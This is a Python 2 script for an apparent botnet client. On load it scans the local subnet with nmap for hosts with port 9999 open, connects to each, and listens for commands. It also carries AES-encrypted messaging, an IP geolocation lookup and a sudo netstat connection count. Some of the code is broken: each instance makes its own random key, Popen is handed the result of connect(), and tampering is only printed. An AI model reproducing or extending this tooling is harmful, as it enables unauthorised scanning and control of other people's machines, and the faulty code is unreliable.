from Crypto.Cipher import AES
from Crypto import Random
import nmap
import subprocess
import base64
import hashlib
import hmac
import socket
import urllib

class Bot:

    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BLOCK_SIZE = 16
    PADDING = '\0'
    
        
    def __init__(self, port):
        self.port = port
        self.key = Random.new().read(self.BLOCK_SIZE)
        self.scan_network()


    def connect(self, serv, portNum):
        self.SERVER.connect((serv, int(portNum)))
        while True:
            data = self.SERVER.recv(1024)
            print data
            if data.find('QUIT') != -1:
                break


    def send_message(self, message):
        self.SERVER.sendall(self.encryptAES(message))


    def receive_message(self, message):
        return self.decryptAES(message)


    def encryptAES(self, message):
        iv = Random.new().read(self.BLOCK_SIZE)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = base64.b64encode(iv + cipher.encrypt(self.pad(message)))
        digest = self.get_hmac(ciphertext)
        return str(digest) + str(ciphertext)


    def decryptAES(self, ciphertext):
        digest = ciphertext[:16]
        ciphertext = ciphertext[16:]
        if str(digest) != str(self.get_hmac(ciphertext)):
            print("[-] MESSAGE TAMPERED")
        iv = base64.b64decode(ciphertext)[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return cipher.decrypt(base64.b64decode(ciphertext)[16:])\
        .rstrip(self.PADDING)
                    

    def get_hmac(self, message):
        key = hashlib.sha1(self.key).digest()
        digest = hmac.new(key, message, hashlib.sha512).digest()
        return base64.b64encode(digest)[:16]


    def pad(self, message):
        return message + (self.BLOCK_SIZE - len(message) % self.BLOCK_SIZE) * \
        self.PADDING


    def get_ip_location(self, ip):
        return urllib.urlopen('http://api.hostip.info/get_html.php?ip='+ip+\
            '&position=true').read()


    def get_active_connections(self):
        cmd = "sudo netstat -alpn | grep :80 | awk '{print $5}' |awk -F: "\
        "'{print $(NF-1)}' |sort | uniq -c | sort -n"
        ps =  subprocess.Popen(cmd, stdout=subprocess.PIPE, \
            stderr=subprocess.STDOUT, shell=True)
        return ps.communicate()[0]

    
    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        ip = s.getsockname()[0]
        s.close()
        return ip


    def scan_network(self):
        nm = nmap.PortScanner()
        ip_range = self.get_local_ip()[:-2] + '.0/24'
        
        nm.scan(hosts=ip_range, arguments='-n -PN -PA'+self.port)
        for host in nm.all_hosts():
            try:
                if nm[host]['tcp'][int(self.port)]['state'] == 'open':
                    print("%s \tOPEN" % host)
                    subprocess.Popen(self.connect(host, self.port), stdout=subprocess.PIPE, \
                        stderr=subprocess.STDOUT, shell=True)
                else:
                    print("%s \tClosed" % host)
            except:
                print("%s \tClosed" % host)

bot = Bot('9999')